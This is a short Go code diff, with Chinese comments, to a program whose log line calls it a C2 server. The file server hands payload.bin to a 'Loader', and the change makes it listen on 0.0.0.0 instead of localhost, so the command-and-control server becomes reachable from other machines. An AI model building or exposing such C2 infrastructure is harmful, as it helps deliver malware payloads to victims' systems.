@@ -240,9 +240,10 @@ func main() {
 	// 这样 Loader 才能下载到 payload.bin，浏览器才能访问 index.html
 	http.Handle("/", http.FileServer(http.Dir(".")))
 
-	fmt.Println("[*] C2 Server (Full Version) 启动: 监听 127.0.0.1:8080")
+	fmt.Println("[*] C2 Server (Full Version) 启动: 监听 0.0.0.0:8080")
 	// 监听
-	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
+	if err := http.ListenAndServe("0.0.0.0:8080", nil); err != nil {
 		fmt.Println("启动失败:", err)
 	}
+
 }
